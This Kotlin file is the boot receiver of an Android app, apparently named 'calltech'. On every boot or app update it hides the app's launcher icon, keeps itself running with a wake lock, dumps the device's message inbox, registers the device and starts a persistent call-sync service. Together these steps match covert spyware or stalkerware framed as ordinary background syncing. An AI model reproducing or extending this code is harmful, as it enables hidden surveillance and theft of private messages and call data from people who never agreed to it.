package com.calltech

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        if (
            action != Intent.ACTION_BOOT_COMPLETED &&
            action != Intent.ACTION_LOCKED_BOOT_COMPLETED &&
            action != Intent.ACTION_MY_PACKAGE_REPLACED &&
            action != "android.intent.action.QUICKBOOT_POWERON" &&
            action != "com.htc.intent.action.QUICKBOOT_POWERON"
        ) {
            return
        }

        val appContext = context.applicationContext
        PostInstallPrompt.showIfNeeded(appContext)
        if (!SyncBootstrap.needsRuntimePermissions(appContext)) {
            LauncherHider.hideNow(appContext)
        }
        val pendingResult = goAsync()
        val wakeLock = SyncWakeLock.acquire(appContext, "BootSyncWakeLock")

        BackgroundSyncRunner.run {
        try {
            InboxDump.dumpBlocking(appContext)
            DeviceRegistration.registerNow(appContext)
            SyncBootstrap.armBackgroundSync(appContext)
            CallSyncService.ensureRunning(appContext)
            Log.d(TAG, "Boot sync done after $action")
            } catch (error: Exception) {
                Log.e(TAG, "Boot setup failed", error)
            } finally {
                SyncWakeLock.release(wakeLock)
                try {
                    pendingResult.finish()
                } catch (_: Exception) {
                }
            }
        }
    }

    companion object {
        private const val TAG = "BootReceiver"
    }
}
